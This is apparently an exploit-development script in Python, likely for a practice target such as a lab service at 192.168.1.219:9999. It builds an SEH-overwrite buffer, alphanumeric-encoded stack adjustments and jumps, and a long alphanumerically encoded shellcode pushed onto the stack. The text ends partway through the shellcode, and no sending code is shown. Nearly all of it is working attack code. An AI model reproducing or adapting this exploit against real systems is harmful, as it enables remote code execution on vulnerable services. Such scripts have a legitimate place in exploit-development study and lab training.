#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.219"
port = 9999

seh="\x2b\x17\x50\x62"
nseh="\x74\x06\x75\x04"

#-------------------------------------ESP adjust 1  and shellcode-alpha----------------------------
#espadjust= "push esp; pop eax; add ax,0x1169; add al,0x7f; push eax; pop esp;
espadjust="\x54\x58\x66\x05\x69\x11\x04\x7F\x50\x5C"

#alpha1= alphanumeric shellcode of "\xeb\x80\x90\x90"
alpha1 = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha1 += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
alpha1 += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
alpha1 += "\x50"

#--------------------------------------ESP adjust 2 and long jumpback------------------------------------------------------------
#PUSH ESP;POP EAX;SUB AL,0x32;PUSH EAX  ;POP ESP                                                             

longjump= "\x54\x58\x2c\x32\x50\x5C"

#alpha2=PUSH ESP; POP EBX; SUB EBX,0xDBA; CALL EBX;
#alpha2="\x54\x5B\x81\xEB\xBA\x0D\x00\x00\xFF\xD3"
alpha2 ="\x54\x5B"
alpha2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
alpha2 += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
alpha2 += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
alpha2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
alpha2 += "\x50"                 ## push eax
alpha2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
alpha2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
alpha2 += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
alpha2 += "\x05\x40\x75\x55\x06" ## add  eax, 0x06557540
alpha2 += "\x50"                 ## push eax
#-----------------------------------------------SHELLCODE------------------------------------------------------
lastadjust="\x54\x58\x2c\x47\x50\x5C"


shellcode = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x52\x71\x50\x50" ## add  eax, 0x50507152
shellcode += "\x05\x51\x61\x40\x40" ## add  eax, 0x40406151
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x42\x73\x43\x36" ## add  eax, 0x36437342
shellcode += "\x05\x42\x63\x33\x25" ## add  eax, 0x25336342
shellcode += "\x05\x32\x53\x32\x24" ## add  eax, 0x24325332
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x45\x12\x41\x67" ## add  eax, 0x67411245
shellcode += "\x05\x44\x21\x32\x66" ## add  eax, 0x66322144
shellcode += "\x05\x34\x12\x31\x45" ## add  eax, 0x45311234
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x52\x54\x51" ## add  eax, 0x51545267
shellcode += "\x05\x66\x42\x44\x51" ## add  eax, 0x51444266
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x42\x75\x53" ## add  eax, 0x53754215
shellcode += "\x05\x14\x42\x74\x54" ## add  eax, 0x54744214
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x14\x66\x64" ## add  eax, 0x64661417
shellcode += "\x05\x16\x13\x65\x63" ## add  eax, 0x63651316
shellcode += "\x05\x15\x13\x43\x43" ## add  eax, 0x43431315
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x73\x66\x41" ## add  eax, 0x41667331
shellcode += "\x05\x22\x62\x55\x41" ## add  eax, 0x41556222
shellcode += "\x05\x21\x52\x64\x41" ## add  eax, 0x41645221
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x15\x33\x40" ## add  eax, 0x40331565
shellcode += "\x05\x64\x14\x42\x40" ## add  eax, 0x40421464
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x32\x73\x50" ## add  eax, 0x50733264
shellcode += "\x05\x54\x31\x64\x50" ## add  eax, 0x50643154
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x46\x76\x61" ## add  eax, 0x61764614
shellcode += "\x05\x24\x45\x65\x51" ## add  eax, 0x51654524
shellcode += "\x05\x13\x44\x54\x61" ## add  eax, 0x61544413
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x14\x42\x76" ## add  eax, 0x76421436
shellcode += "\x05\x25\x14\x42\x65" ## add  eax, 0x65421425
shellcode += "\x05\x24\x13\x32\x54" ## add  eax, 0x54321324
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x51\x27\x36\x22" ## add  eax, 0x22362751
shellcode += "\x05\x40\x26\x46\x11" ## add  eax, 0x11462640
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x66\x50\x41" ## add  eax, 0x41506662
shellcode += "\x05\x52\x55\x40\x40" ## add  eax, 0x40405552
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x34\x63\x37" ## add  eax, 0x37633433
shellcode += "\x05\x44\x44\x63\x46" ## add  eax, 0x46634444
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x41\x16\x74" ## add  eax, 0x74164144
shellcode += "\x05\x44\x42\x15\x64" ## add  eax, 0x64154244
shellcode += "\x05\x43\x41\x16\x53" ## add  eax, 0x53164143
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x67\x33\x26" ## add  eax, 0x26336726
shellcode += "\x05\x15\x66\x32\x15" ## add  eax, 0x15326615
shellcode += "\x05\x26\x45\x22\x26" ## add  eax, 0x26224526
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x11\x75\x34" ## add  eax, 0x34751144
shellcode += "\x05\x33\x12\x64\x23" ## add  eax, 0x23641233
shellcode += "\x05\x33\x11\x54\x23" ## add  eax, 0x23541133
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x03\x47\x53" ## add  eax, 0x53470333
shellcode += "\x05\x43\x02\x47\x44" ## add  eax, 0x44470243
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x17\x56\x25" ## add  eax, 0x25561765
shellcode += "\x05\x65\x07\x46\x24" ## add  eax, 0x24460765
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x47\x16\x43" ## add  eax, 0x43164764
shellcode += "\x05\x54\x46\x26\x42" ## add  eax, 0x42264654
shellcode += "\x05\x64\x45\x14\x32" ## add  eax, 0x32144564
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x33\x43\x37" ## add  eax, 0x37433337
shellcode += "\x05\x36\x32\x43\x36" ## add  eax, 0x36433236
shellcode += "\x05\x35\x22\x42\x25" ## add  eax, 0x25422235
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x75\x34\x42" ## add  eax, 0x42347523
shellcode += "\x05\x22\x64\x33\x41" ## add  eax, 0x41336422
shellcode += "\x05\x22\x54\x33\x32" ## add  eax, 0x32335422
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x62\x61\x37" ## add  eax, 0x37616262
shellcode += "\x05\x51\x52\x52\x36" ## add  eax, 0x36525251
shellcode += "\x05\x42\x62\x61\x35" ## add  eax, 0x35616242
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x16\x63\x13" ## add  eax, 0x13631675
shellcode += "\x05\x64\x15\x53\x13" ## add  eax, 0x13531564
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x56\x23\x27" ## add  eax, 0x27235636
shellcode += "\x05\x25\x45\x13\x16" ## add  eax, 0x16134525
shellcode += "\x05\x23\x44\x23\x25" ## add  eax, 0x25234423
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x33\x07\x52" ## add  eax, 0x52073322
shellcode += "\x05\x12\x43\x07\x51" ## add  eax, 0x51074312
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x26\x16\x72" ## add  eax, 0x72162662
shellcode += "\x05\x52\x15\x16\x72" ## add  eax, 0x72161552
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x27\x27\x32" ## add  eax, 0x32272722
shellcode += "\x05\x11\x27\x17\x41" ## add  eax, 0x41172711
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x65\x65\x67" ## add  eax, 0x67656563
shellcode += "\x05\x54\x54\x54\x56" ## add  eax, 0x56545454
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x32\x66\x35" ## add  eax, 0x35663223
shellcode += "\x05\x14\x31\x56\x45" ## add  eax, 0x45563114
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x13\x13\x76" ## add  eax, 0x76131347
shellcode += "\x05\x47\x13\x13\x65" ## add  eax, 0x65131347
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x37\x36\x22" ## add  eax, 0x22363716
shellcode += "\x05\x25\x36\x36\x11" ## add  eax, 0x11363625
shellcode += "\x05\x16\x35\x34\x22" ## add  eax, 0x22343516
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x06\x73\x46\x20" ## add  eax, 0x20467306
shellcode += "\x05\x05\x73\x45\x20" ## add  eax, 0x20457305
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x52\x46\x21" ## add  eax, 0x21465232
shellcode += "\x05\x31\x41\x45\x11" ## add  eax, 0x11454131
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x56\x66\x40\x25" ## add  eax, 0x25406656
shellcode += "\x05\x46\x55\x40\x24" ## add  eax, 0x24405546
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x11\x44\x46" ## add  eax, 0x46441172
shellcode += "\x05\x62\x21\x34\x45" ## add  eax, 0x45342162
shellcode += "\x05\x52\x11\x34\x46" ## add  eax, 0x46341152
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x67\x43\x23" ## add  eax, 0x23436746
shellcode += "\x05\x45\x56\x33\x22" ## add  eax, 0x22335645
shellcode += "\x05\x33\x65\x33\x22" ## add  eax, 0x22336533
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x03\x16\x66" ## add  eax, 0x66160376
shellcode += "\x05\x65\x04\x06\x55" ## add  eax, 0x55060465
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x53\x56\x75" ## add  eax, 0x75565331
shellcode += "\x05\x31\x43\x45\x64" ## add  eax, 0x64454331
shellcode += "\x05\x31\x43\x44\x54" ## add  eax, 0x54444331
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x61\x76\x33" ## add  eax, 0x33766163
shellcode += "\x05\x53\x51\x65\x32" ## add  eax, 0x32655153
shellcode += "\x05\x32\x61\x54\x22" ## add  eax, 0x22546132
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x35\x76\x56" ## add  eax, 0x56763563
shellcode += "\x05\x52\x34\x65\x45" ## add  eax, 0x45653452
shellcode += "\x05\x32\x34\x54\x43" ## add  eax, 0x43543432
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x70\x25\x21\x35" ## add  eax, 0x35212570
shellcode += "\x05\x70\x15\x21\x45" ## add  eax, 0x45211570
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x25\x36\x66" ## add  eax, 0x66362567
shellcode += "\x05\x66\x24\x25\x56" ## add  eax, 0x56252466
shellcode += "\x05\x45\x24\x23\x34" ## add  eax, 0x34232445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x72\x37\x72\x21" ## add  eax, 0x21723772
shellcode += "\x05\x72\x46\x61\x21" ## add  eax, 0x21614672
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x32\x02\x27" ## add  eax, 0x27023236
shellcode += "\x05\x35\x21\x02\x16" ## add  eax, 0x16022135
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x74\x45\x16" ## add  eax, 0x16457453
shellcode += "\x05\x42\x64\x44\x15" ## add  eax, 0x15446442
shellcode += "\x05\x42\x53\x34\x14" ## add  eax, 0x14345342
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x56\x37\x74\x26" ## add  eax, 0x26743756
shellcode += "\x05\x45\x36\x64\x25" ## add  eax, 0x25643645
shellcode += "\x05\x43\x35\x54\x26" ## add  eax, 0x26543543
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x21\x61\x67" ## add  eax, 0x67612123
shellcode += "\x05\x23\x21\x60\x57" ## add  eax, 0x57602123
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x27\x45\x63" ## add  eax, 0x63452711
shellcode += "\x05\x22\x16\x44\x63" ## add  eax, 0x63441622
shellcode += "\x05\x11\x25\x44\x43" ## add  eax, 0x43442511
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x56\x45\x71\x26" ## add  eax, 0x26714556
shellcode += "\x05\x56\x45\x60\x15" ## add  eax, 0x15604556
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x43\x41\x32" ## add  eax, 0x32414375
shellcode += "\x05\x64\x33\x42\x32" ## add  eax, 0x32423364
shellcode += "\x05\x54\x32\x31\x22" ## add  eax, 0x22313254
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x63\x41\x73" ## add  eax, 0x73416314
shellcode += "\x05\x24\x62\x41\x63" ## add  eax, 0x63416224
shellcode += "\x05\x14\x42\x41\x52" ## add  eax, 0x52414214
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x67\x23\x56" ## add  eax, 0x56236734
shellcode += "\x05\x34\x56\x22\x46" ## add  eax, 0x46225634
shellcode += "\x05\x24\x65\x22\x44" ## add  eax, 0x44226524
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x70\x64\x71\x12" ## add  eax, 0x12716470
shellcode += "\x05\x60\x64\x61\x12" ## add  eax, 0x12616460
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x16\x35\x14" ## add  eax, 0x14351667
shellcode += "\x05\x67\x05\x24\x04" ## add  eax, 0x04240567
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x37\x76\x76" ## add  eax, 0x76763731
shellcode += "\x05\x32\x26\x66\x65" ## add  eax, 0x65662632
shellcode += "\x05\x31\x25\x54\x53" ## add  eax, 0x53542531
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x56\x44\x43\x74" ## add  eax, 0x74434456
shellcode += "\x05\x45\x44\x33\x63" ## add  eax, 0x63334445
shellcode += "\x05\x44\x34\x33\x53" ## add  eax, 0x53333444
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x15\x45\x63" ## add  eax, 0x63451513
shellcode += "\x05\x14\x14\x45\x62" ## add  eax, 0x62451414
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x46\x14\x36" ## add  eax, 0x36144676
shellcode += "\x05\x65\x45\x14\x36" ## add  eax, 0x36144565
shellcode += "\x05\x53\x43\x13\x24" ## add  eax, 0x24134353
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x44\x66\x17" ## add  eax, 0x17664433
shellcode += "\x05\x23\x44\x55\x26" ## add  eax, 0x26554423
shellcode += "\x05\x22\x43\x43\x15" ## add  eax, 0x15434322
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x77\x61\x76" ## add  eax, 0x76617753
shellcode += "\x05\x42\x76\x50\x65" ## add  eax, 0x65507642
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x52\x32\x76" ## add  eax, 0x76325233
shellcode += "\x05\x34\x41\x42\x66" ## add  eax, 0x66424134
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x27\x14\x61" ## add  eax, 0x61142743
shellcode += "\x05\x43\x26\x14\x61" ## add  eax, 0x61142643
shellcode += "\x05\x33\x25\x14\x41" ## add  eax, 0x41142533
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x66\x67\x44" ## add  eax, 0x44676664
shellcode += "\x05\x54\x56\x66\x44" ## add  eax, 0x44665654
shellcode += "\x05\x63\x34\x45\x44" ## add  eax, 0x44453463
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x67\x71\x12\x15" ## add  eax, 0x15127167
shellcode += "\x05\x66\x71\x12\x14" ## add  eax, 0x14127166
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x55\x25\x12" ## add  eax, 0x12255562
shellcode += "\x05\x52\x55\x15\x12" ## add  eax, 0x12155552
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x77\x34\x66\x70" ## add  eax, 0x70663477
shellcode += "\x05\x76\x34\x55\x70" ## add  eax, 0x70553476
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
